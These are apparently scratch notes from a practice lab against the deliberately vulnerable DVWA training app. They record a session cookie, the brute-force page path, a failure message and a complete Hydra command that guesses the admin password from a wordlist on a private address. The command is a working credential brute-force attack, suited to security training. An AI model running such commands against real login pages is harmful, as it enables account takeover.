PHPSESSID=rt822gu1e7q3umn52sfqotg0r7
/vulnerabilities/brute/?username=s&password=f&Login=Login#
/vulnerabilities/brute/:username=^USR^&password=^PASS^&Login=Login
Username and/or password incorrect.


hydra -l admin -P password.txt 192.168.111.136 http-get-form  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=rt822gu1e7q3umn52sfqotg0r7;Security=low:F=Username and/or password incorrect." -t 30
